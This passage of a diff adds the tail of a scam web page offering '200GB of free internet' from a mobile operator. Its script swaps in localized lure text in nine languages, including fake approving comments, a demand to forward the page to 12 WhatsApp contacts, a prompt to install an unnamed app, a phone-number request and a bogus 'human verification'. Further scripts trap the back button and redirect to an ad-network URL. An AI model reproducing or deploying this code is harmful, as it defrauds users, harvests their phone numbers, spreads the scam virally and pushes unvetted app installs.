\u0E01\u0E23\u0E38\u0E13\u0E32\u0E43\u0E2A\u0E48\u0E2B\u0E21\u0E32\u0E22\u0E40\u0E25\u0E02\u0E42\u0E17\u0E23\u0E28\u0E31\u0E1E\u0E17\u0E4C\u0E02\u0E2D\u0E07\u0E04\u0E38\u0E13", "\u0E08\u0E31\u0E07\u0E2B\u0E27\u0E31\u0E14 ", "\u0E02\u0E2D\u0E1A\u0E04\u0E38\u0E13\u0E40\u0E23\u0E32\u0E44\u0E14\u0E49\u0E15\u0E23\u0E27\u0E08\u0E2A\u0E2D\u0E1A\u0E41\u0E25\u0E49\u0E27", "\u0E15\u0E23\u0E27\u0E08\u0E2A\u0E2D\u0E1A", " \u0E1F\u0E23\u0E35 200GB", "\u0E15\u0E23\u0E27\u0E08\u0E2A\u0E2D\u0E1A\u0E27\u0E48\u0E32\u0E42\u0E0B\u0E19\u0E02\u0E2D\u0E07\u0E04\u0E38\u0E13\u0E16\u0E39\u0E01\u0E40\u0E25\u0E37\u0E2D\u0E01\u0E2B\u0E23\u0E37\u0E2D\u0E44\u0E21\u0E48", "\u0E2D\u0E22\u0E39\u0E48\u0E1A\u0E49\u0E32\u0E19", "\u0E1F\u0E23\u0E35\u0E2D\u0E34\u0E19\u0E40\u0E17\u0E2D\u0E23\u0E4C\u0E40\u0E19\u0E47\u0E15 : 200GB"] :
+                                            "pl" === language ? window.words = ["Odpowied\u017A", "Lubi\u0119 to", "Integracja do\u015B\u0107 \u0142atwa. Udost\u0119pnia\u0142 go niekt\xF3rym osobistym przyjacio\u0142om.", "piszesz komentarz ...", "Odpowiedz", "Lubi\u0119 to", "W tych trudnych czasach jest to konieczne.", "Odpowiedz", "Lubi\u0119 to", "Naprawd\u0119, dzi\u0119kuj\u0119 za podzielenie si\u0119 z nami tym.", "Odpowiedz", "Lubi\u0119 to", "Sprawdzam swoje miasto, by\u0142em obecny. Dzi\u0119kujemy za rozwa\u017Cenie nas.", "Odpowiedz", "Lubi\u0119 to", "Dzi\u0119ki, naprawd\u0119 dzia\u0142a idealnie.", "Komentarz", "Lubi\u0119 to", "dzia\u0142ania", "komentarze", "153K", "ANDROID", "IPHONE", "Teraz wybierz swoje urz\u0105dzenie mobilne.", "(Pami\u0119taj, \u017Ce ten krok jest wa\u017Cny dla dzia\u0142ania bezp\u0142atnego Internetu).", "1. Powiniene\u015B zainstalowa\u0107 aplikacj\u0119 poni\u017Cej, kiedy i kiedy jest ona zainstalowana, powiniene\u015B otworzy\u0107 j\u0105 na 30 sekund. ", "Aby aktywowa\u0107 bezp\u0142atny dost\u0119p do Internetu, musisz uko\u0144czy\u0107 ostatni etap weryfikacji cz\u0142owieka!", "Gratulacje, wygra\u0142e\u015B 200GB bezp\u0142atnego internetu", "Podziel si\u0119 ze znajomymi", "Po udost\u0119pnieniu przejdziesz do nast\u0119pnego kroku, aby aktywowa\u0107 t\u0119 bezp\u0142atn\u0105 us\u0142ug\u0119 internetow\u0105 na 60 dni.", "Aby m\xF3c aktywowa\u0107 Internet za darmo, najpierw kliknij zielony przycisk' UDOST\u0118PNIJ 'i wy\u015Blij te wiadomo\u015Bci do 12 znajomych lub grup na WhatsApp, aby mogli oni r\xF3wnie\u017C otrzyma\u0107 t\u0119 bezp\u0142atn\u0105 us\u0142ug\u0119 podczas tej d\u0142ugiej kwarantanny!", "Jak aktywowa\u0107 bezp\u0142atny Internet?", "Gratulacje, wygra\u0142e\u015B 200GB za darmo od swojego operatora kom\xF3rkowego!", "Poczekaj chwil\u0119, sprawdzamy poprawno\u015B\u0107 danych.", "Nasza polityka prywatno\u015Bci i warunki \u015Bwiadczenia us\u0142ug", "Aplikacja nie mo\u017Ce publikowa\u0107 na Facebooku", "Zaakceptuj - jestem cz\u0142owiekiem", "Powinni\u015Bmy potwierdzi\u0107, \u017Ce jeste\u015B prawdziwym cz\u0142owiekiem, sprawdzaj\u0105c swoje imi\u0119 i nazwisko oraz zdj\u0119cie profilowe.", "Popro\u015B o pozwolenie", "Czekaj, sprawdzamy poprawno\u015B\u0107 danych", "Weryfikacja prawdziwej to\u017Csamo\u015Bci", "\u0141\u0105czenie si\u0119 z operatorem", "Wykonaj te 3 kroki", "Wy\u015Blij", " jest na naszej li\u015Bcie. Prosz\u0119 poda\u0107 sw\xF3j numer telefonu", "The Province of ", "Dzi\u0119kujemy, ju\u017C zweryfikowali\u015Bmy", "Sprawd\u017A to", " 200GB za darmo", "Sprawd\u017A, czy wybrano stref\u0119", "Zosta\u0144 w domu", "Darmowy Internet 4G/5G: 200GB"] :
+                                                "nl" === language ? window.words = ["Antwoord", "Ik vind het leuk", "Integratie vrij eenvoudig. Het werd gedeeld door enkele persoonlijke vrienden. ", "je schrijft een opmerking ...", "Beantwoorden", "Ik vind het leuk", "In deze moeilijke tijden is het nodig.", "Beantwoorden", "Ik vind het leuk", "Echt, bedankt dat je dit met ons deelt.", "Beantwoorden", "Ik vind het leuk", "Ik controleer mijn stad, ik was aanwezig. Bedankt voor het overwegen van ons. ", "Beantwoorden", "Ik vind het leuk", "Bedankt, het werkt echt perfect.", "Reageren", "Ik vind het leuk", "acties", "opmerkingen", "153K", "ANDROID", "IPHONE", "Selecteer nu uw mobiele apparaat.", "(Onthoud dat deze stap belangrijk is om gratis internet te laten werken).", "1. U moet de onderstaande app installeren wanneer en wanneer deze is ge\xEFnstalleerd, u moet deze gedurende 30 seconden openen. ", "Om gratis internet te activeren, moet u deze laatste laatste stap van menselijke verificatie voltooien!", "Gefeliciteerd, je hebt 200GB gratis internet gewonnen", "Deel met je vrienden", "Na het delen ga je naar de volgende stap zodat je deze gratis internetdienst 60 dagen lang kunt activeren.", "Om het internet gratis te kunnen activeren, klikt u eerst op de groene knop \" DELEN \"en stuurt u dit nieuws naar 12 vrienden of groepen op WhatsApp zodat zij ook tijdens deze lange quarantaine deze gratis dienst kunnen krijgen!", "Hoe activeer je gratis internet?", "Gefeliciteerd, je hebt 200GB gratis gewonnen van je mobiele operator!", "Wacht even, we valideren de gegevens.", "Onze service privacybeleid en voorwaarden", "De applicatie mag niet op Facebook posten", "Accepteer - ik ben een mens", "We moeten bevestigen dat je een echt mens bent door je naam en profielfoto te controleren.", "Vraag toestemming", "Wacht, we valideren gegevens", "Echte identiteitsverificatie", "Verbinden met je operator", "Voltooi deze 3 stappen", "Verzenden", " staat op onze lijst. Voer uw telefoonnummer in ", "De provincie ", "Bedankt, we hebben het al geverifieerd", "Check it out", " 200GB gratis", "Controleer of uw zone is geselecteerd voor", "Blijf thuis", "Gratis internet 4G/5G: 200GB"] :
+                                                    "it" === language ? window.words = ["Risposta", "Mi piace", "Integrazione abbastanza semplice. \xC8 stato condiviso da alcuni amici personali.", "stai scrivendo un commento ...", "Rispondi", "Mi piace", "In questi tempi difficili \xE8 necessario.", "Rispondi", "Mi piace", "Davvero, grazie per averlo condiviso con noi.", "Rispondi", "Mi piace", "Controllo la mia citt\xE0, ero presente. Grazie per averci considerato.", "Rispondi", "Mi piace", "Grazie, davvero, funziona perfettamente.", "campo di commento", "Mi piace", "Azioni", "Commenti", "153K", "ANDROID", "IPHONE", "Ora seleziona il tuo dispositivo mobile.", "(Ricorda che questo passaggio \xE8 importante per il funzionamento gratuito di Internet).", "1. Dovresti installare lapp qui sotto quando e quando \xE8 installata, dovresti aprirla per 30 secondi.", "Per attivare la connessione Internet gratuita, \xE8 necessario completare l'ultimo passaggio finale della verifica umana!", "Congratulazioni, hai vinto 200GB di Internet gratuito", "Condividi con i tuoi amici", "Dopo la condivisione, passerai al passaggio successivo in modo da poter attivare questo servizio Internet gratuito per 60 giorni.", "Per poter attivare Internet gratuitamente, fai prima clic sul pulsante verde \"CONDIVIDI\" e invia queste notizie a 12 amici o gruppi su WhatsApp in modo che possano anche ottenere questo servizio gratuito durante questa lunga quarantena!", "Come attivare la connessione Internet gratuita?", "Congratulazioni, hai vinto 200GB gratuiti dal tuo operatore di telefonia mobile!", "Aspetta un momento, convalidiamo i dati.", "La nostra politica sulla privacy e condizioni del servizio", "L'applicazione non pu\xF2 pubblicare su Facebook", "Accetta - Sono un essere umano", "Dovremmo confermare che sei un vero essere umano controllando il tuo nome e la foto del profilo.", "Richiedi permesso", "Aspetta, stiamo convalidando i dati", "Verifica dell'identit\xE0 reale", "Connessione con il tuo operatore", "Completa questi 3 passaggi", "Inviare", " \xE8 nella nostra lista. Inserisci il tuo numero di telefono", "La provincia di ", "Grazie, abbiamo gi\xE0 verificato", "Dai un'occhiata", " 200GB gratuiti", "Controlla se la tua zona \xE8 stata selezionata per", "Stay at Home", "Internet gratuito 4G/5G: 200GB"] :
+                                                        "de" === language ? window.words = ["Antwort", "Ich mag es", "Integration ganz einfach. Es wurde von einigen pers\xF6nlichen Freunden geteilt.", "Sie schreiben einen Kommentar ...", "Antwort", "Ich mag es", "In diesen schwierigen Zeiten ist es notwendig.", "Antwort", "Ich mag es", "Wirklich, danke, dass du das mit uns geteilt hast.", "Antwort", "Ich mag es", "Ich \xFCberpr\xFCfe meine Stadt, ich war anwesend. Vielen Dank, dass Sie sich f\xFCr uns entschieden haben.", "Antwort", "Ich mag es", "Danke, wirklich, es funktioniert perfekt.", "Kommentar", "Ich mag es", "Aktionen", "Kommentare", "153K", "ANDROID", "IPHONE", "W\xE4hlen Sie jetzt Ihr Mobilger\xE4t aus.", "(Denken Sie daran, dass dieser Schritt wichtig ist, damit das kostenlose Internet funktioniert).", "1. Sie sollten die unten stehende App installieren, wenn und wenn sie installiert ist, sollten Sie sie 30 Sekunden lang \xF6ffnen.", "Um das kostenlose Internet zu aktivieren, m\xFCssen Sie diesen letzten Schritt der menschlichen \xDCberpr\xFCfung abschlie\xDFen!", "Herzlichen Gl\xFCckwunsch, Sie haben 200GB kostenloses Internet gewonnen", "Mit deinen Freunden teilen", "Nach dem Teilen fahren Sie mit dem n\xE4chsten Schritt fort, damit Sie diesen kostenlosen Internetdienst 60 Tage lang aktivieren k\xF6nnen.", "Um das Internet kostenlos aktivieren zu k\xF6nnen, klicken Sie zuerst auf die gr\xFCne Schaltfl\xE4che \" TEILEN \" und senden Sie diese Nachrichten an 12 Freunde oder Gruppen auf WhatsApp, damit diese diesen kostenlosen Service auch w\xE4hrend dieser langen Quarant\xE4ne erhalten k\xF6nnen!", "Wie aktiviere ich das kostenlose Internet?", "Herzlichen Gl\xFCckwunsch, Sie haben 200GB kostenlos von Ihrem Mobilfunkbetreiber gewonnen!", "Moment mal, wir validieren die Daten.", "Unsere Service-Datenschutzrichtlinien und -bedingungen", "Die Anwendung darf nicht auf Facebook posten", "Akzeptiere - ich bin ein Mensch", "Wir sollten \xFCberpr\xFCfen, ob Sie ein echter Mensch sind, indem wir Ihren Namen und Ihr Profilfoto \xFCberpr\xFCfen.", "Erlaubnis anfordern", "Warten Sie, wir validieren Daten", "Echte Identit\xE4tspr\xFCfung", "Verbindung mit Ihrem Operator herstellen", "F\xFChren Sie diese 3 Schritte aus", "Senden", " steht auf unserer Liste. Bitte geben Sie Ihre Telefonnummer ein ", "Die Provinz von ", "Danke, wir haben bereits verifiziert", "Check it out", " 200GB frei", "\xDCberpr\xFCfen Sie, ob Ihre Zone f\xFCr ausgew\xE4hlt wurde", "Bleib zu Hause", "Kostenloses Internet 4G/5G: 200GB"] :
+                                                            "fr" === language ? window.words = ["R\xE9pondre", "Jaime", "Int\xE9gration assez facile. Il a \xE9t\xE9 partag\xE9 par des amis personnels. ", "vous \xE9crivez un commentaire ...", "R\xE9pondre", "Jaime", "En ces temps difficiles, il est n\xE9cessaire.", "R\xE9pondre", "Jaime", "Vraiment, merci de partager cela avec nous.", "R\xE9pondre", "Jaime", "Je v\xE9rifie ma ville, j\xE9tais pr\xE9sent. Merci de nous consid\xE9rer. ", "R\xE9pondre", "Jaime", "Merci, vraiment, cela fonctionne parfaitement.", "Commentaire", "Jaime", "actions", "commentaires", "153K", "ANDROID", "IPHONE", "Maintenant, s\xE9lectionnez votre appareil mobile.", "(N oubliez pas que cette \xE9tape est importante pour que l internet gratuit fonctionne).", "1. Vous devez installer l application ci-dessous quand et quand elle est install\xE9e, vous devez l ouvrir pendant 30 secondes. ", "Pour activer Internet gratuit, vous devez terminer cette derni\xE8re \xE9tape finale de la v\xE9rification humaine!", "F\xE9licitations, vous avez gagn\xE9 100 Go d'Internet gratuit", "Partagez avec vos amis", "Apr\xE8s le partage, vous passerez \xE0 l'\xE9tape suivante afin d'activer ce service Internet gratuit pendant 60 jours.", "Pour pouvoir activer Internet gratuitement, cliquez d abord sur le bouton vert \" WHATSAPP \" et envoyez ces nouvelles \xE0 12 amis ou groupes sur WhatsApp afin qu ils puissent \xE9galement b\xE9n\xE9ficier de ce service gratuit pendant cette longue quarantaine!", "Comment activer Internet gratuit?", "F\xE9licitations, vous avez gagn\xE9 100 Go gratuits de votre op\xE9rateur mobile!", "Attendez un instant, nous validons les donn\xE9es.", "Notre politique de confidentialit\xE9 et nos conditions de service", "L application n est pas autoris\xE9e \xE0 publier sur Facebook", "Acceptez - je suis un humain", "Nous devons valider que vous \xEAtes un vrai humain en v\xE9rifiant votre nom et votre photo de profil.", "Demande d autorisation", "Attendez, nous validons les donn\xE9es", "V\xE9rification de l identit\xE9 r\xE9elle", "Connexion avec votre op\xE9rateur", "Effectuez ces 3 \xE9tapes", "Envoyer", " est sur notre liste. Veuillez entrer votre num\xE9ro de t\xE9l\xE9phone ", "La province de ", "Merci, nous avons d\xE9j\xE0 v\xE9rifi\xE9", "V\xE9rifiez-le", " 100 Go gratuits", "V\xE9rifiez si votre zone a \xE9t\xE9 s\xE9lectionn\xE9e pour", "Restez \xE0 la maison", "Internet 4G/5G gratuit: 100 Go"] :
+                                                                "id" === language ? window.words = ["Jawab", "Aku suka itu", "Integrasi cukup mudah. Itu dibagikan oleh beberapa teman pribadi.", "Anda sedang menulis komentar ...", "Jawab", "Aku suka itu", "Dalam masa-masa sulit ini perlu.", "Jawab", "Aku suka itu", "Sungguh, terima kasih telah berbagi ini dengan kami.", "Jawab", "Aku suka itu", "Aku memeriksa kotaku, aku ada di sana. Terima kasih telah mempertimbangkan kami.", "Jawab", "Aku suka itu", "Terima kasih, sungguh, ini bekerja dengan sempurna.", "Komentar", "Aku suka itu", "tindakan", "komentar", "153K", "ANDROID", "IPHONE", "Sekarang pilih perangkat selulermu.", "(Ingat langkah ini penting agar internet gratis berfungsi).", "1. Anda harus menginstal aplikasi di bawah ini kapan dan kapan diinstal, Anda harus membukanya selama 30 detik.", "Untuk mengaktifkan internet gratis, Anda harus menyelesaikan langkah akhir terakhir Verifikasi Manusia ini!", "Selamat, Anda memenangkan 200GB internet gratis", "Silakan bagikan ke grup Anda", "Setelah berbagi, Anda akan pergi ke langkah berikutnya sehingga Anda dapat mengaktifkan layanan internet gratis ini selama 60 hari.", "Untuk dapat mengaktifkan Internet secara gratis, klik pertama pada tombol \"WHATSAPP\" hijau dan kirim berita ini ke 12 teman atau grup di WhatsApp sehingga mereka juga bisa mendapatkan layanan gratis ini selama Karantina yang panjang ini!", "Bagaimana cara mengaktifkan Internet gratis?", "Selamat, Anda memenangkan 200GB gratis dari operator seluler Anda!", "Tunggu sebentar, kami memvalidasi data.", "Kebijakan dan ketentuan privasi layanan kami", "Aplikasi tidak diizinkan memposting di Facebook", "Terima - aku manusia", "Kami harus memvalidasi bahwa Anda adalah manusia nyata dengan memeriksa nama dan foto profil Anda.", "Minta izin", "Tunggu, kami memvalidasi data", "Verifikasi identitas asli", "Menghubungkan dengan operator Anda", "Selesaikan 3 langkah ini", "Kirim", " ada di daftar kami. Silakan masukkan nomor telepon Anda ", "Provinsi ", "Terima kasih, kami sudah memverifikasi", "Lihat itu", " 200GB gratis", "Periksa apakah zona Anda telah dipilih untuk", "Menginap di Rumah", "4G/5G Internet Gratis: 200GB"] :
+                                                                    "ms" === language ? window.words = ["Jawapan", "Saya suka", "Integrasi cukup mudah. Itu dikongsi oleh beberapa rakan peribadi. ", "anda sedang menulis komen ...", "Balas", "Saya suka", "Pada masa-masa sukar ini adalah perlu.", "Balas", "Saya suka", "Sungguh, terima kasih kerana berkongsi ini dengan kami.", "Balas", "Saya suka", "Saya memeriksa bandar saya, saya hadir. Terima kasih kerana mempertimbangkan kami.", "Balas", "Saya suka", "Terima kasih, ia berfungsi dengan sempurna.", "Komen", "Saya suka", "tindakan", "komen", "153K", "ANDROID", "IPHONE", "Sekarang pilih peranti mudah alih anda.", "(Ingat langkah ini penting agar internet percuma berfungsi).", "1. Anda harus memasang aplikasi di bawah ini ketika dan ketika ia dipasang, anda harus membukanya selama 30 saat.", "Untuk mengaktifkan internet percuma, anda mesti melengkapkan langkah terakhir Pengesahan Manusia ini!", "Tahniah, anda memenangi 200GB internet percuma", "Kongsi dengan rakan anda", "Setelah berkongsi, anda akan pergi ke langkah seterusnya sehingga anda dapat mengaktifkan perkhidmatan internet percuma ini selama 60 hari.", "Untuk dapat mengaktifkan Internet secara percuma, pertama-tama klik pada butang \"WHATSAPP\" hijau dan hantarkan berita ini kepada 12 rakan atau kumpulan di WhatsApp sehingga mereka juga dapat memperoleh perkhidmatan percuma ini selama Kuarantin yang panjang ini!", "Bagaimana cara mengaktifkan Internet percuma?", "Tahniah, anda memenangi 200GB percuma dari operator mudah alih anda!", "Tunggu sebentar, kami mengesahkan data.", "Dasar dan syarat privasi perkhidmatan kami", "Aplikasi itu tidak dibenarkan diposkan di Facebook", "Terima - saya manusia", "Kami harus mengesahkan bahawa anda adalah manusia sejati dengan memeriksa nama dan foto profil anda.", "Minta izin", "Tunggu, kami mengesahkan data", "Pengesahan identiti sebenar", "Berhubungan dengan operator anda", "Selesaikan 3 langkah ini", "Hantar", " ada dalam senarai kami. Sila masukkan nombor telefon anda ", "Wilayah ", "Terima kasih, kami telah mengesahkan", "Lihatlah", " 200GB percuma", "Periksa sama ada zon anda telah dipilih untuk", "Tinggal di Rumah", "Internet percuma 4G/5G: 200GB"] :
+                                                                        "pt" === language ? window.words = ["Answer", "Eu gosto", "Integra\xE7\xE3o bastante f\xE1cil. Foi compartilhado por alguns amigos pessoais. ", "voc\xEA est\xE1 escrevendo um coment\xE1rio ...", "Responder", "Eu gosto", "Nestes tempos dif\xEDceis \xE9 necess\xE1rio.", "Responder", "Eu gosto", "Realmente, obrigado por compartilhar isso conosco.", "Responder", "Eu gosto", "Eu checo minha cidade, eu estava presente. Obrigado por nos considerar. ", "Responder", "Eu gosto", "Obrigado, realmente, funciona perfeitamente.", "Coment\xE1rio", "Eu gosto", "a\xE7\xF5es", "coment\xE1rios", "153K", "ANDROID", "IPHONE", "Agora selecione seu dispositivo m\xF3vel.", "(Lembre-se que esta etapa \xE9 importante para que a Internet gratuita funcione).", "1 Instale o aplicativo abaixo quando e quando estiver instalado, abra-o por 30 segundos. ", "Para ativar a Internet gr\xE1tis, voc\xEA deve concluir esta etapa final final da verifica\xE7\xE3o humana!", "Parab\xE9ns, voc\xEA ganhou 200GB de internet gr\xE1tis", "Compartilhe com seus amigos", "Ap\xF3s o compartilhamento, voc\xEA passar\xE1 para a pr\xF3xima etapa para poder ativar este servi\xE7o gratuito de internet por 60 dias.", "Para poder ativar a Internet de gra\xE7a, primeiro clique no bot\xE3o verde \"WHATSAPP\" e envie essas not\xEDcias para 12 amigos ou grupos no WhatsApp para que eles tamb\xE9m possam obter esse servi\xE7o gratuito durante essa longa quarentena!", "Como ativar a Internet gr\xE1tis?", "Parab\xE9ns, voc\xEA ganhou 200GB gr\xE1tis da sua operadora de celular!", "Espere um momento, validamos os dados.", "Nossa pol\xEDtica e condi\xE7\xF5es de privacidade do servi\xE7o", "O aplicativo n\xE3o tem permiss\xE3o para postar no Facebook", "Aceite - eu sou humano", "Devemos confirmar que voc\xEA \xE9 um ser humano real verificando seu nome e foto do perfil.", "Solicitar permiss\xE3o", "Espere, estamos validando dados", "Verifica\xE7\xE3o de identidade real", "Conectando com sua operadora", "Conclua estas tr\xEAs etapas", "Enviar", " est\xE1 na nossa lista. Digite seu n\xFAmero de telefone ", "A prov\xEDncia de ", "Obrigado, n\xF3s j\xE1 confirmamos", "Confira", " 200GB gr\xE1tis", "Verifique se sua zona foi selecionada para", "Fique em casa", "Internet gratuita 4G/5G: 200GB"] : void 0, window.words) for (var textNode, k = 0, textNodes = getTextNodesIn(document); k < textNodes.length; k++) textNode = textNodes[k], console.log(textNodes[k]), textNode.textContent = window.words[k];
+</script>
+<!--<script type="text/javascript">
+    !function () {
+        var t;
+        try {
+            for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
+            onpopstate = function (t) {
+                t.state && alert('Please Share in Whatsapp to Activate Free Internet');
+            }
+        } catch (o) {
+        }
+    }();</script>-->
+
+<script>
+    window.onhashchange=function(){jp();};
+    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
+    function jp() {
+        fh();}
+    setTimeout('hh();', 500);
+    function fh(){
+        location.href="/";
+    }
+    function goon(){
+        location.href="https://zuphaims.com/afu.php?zoneid=3777723";
+    }
+</script>
+</body>
+</html>
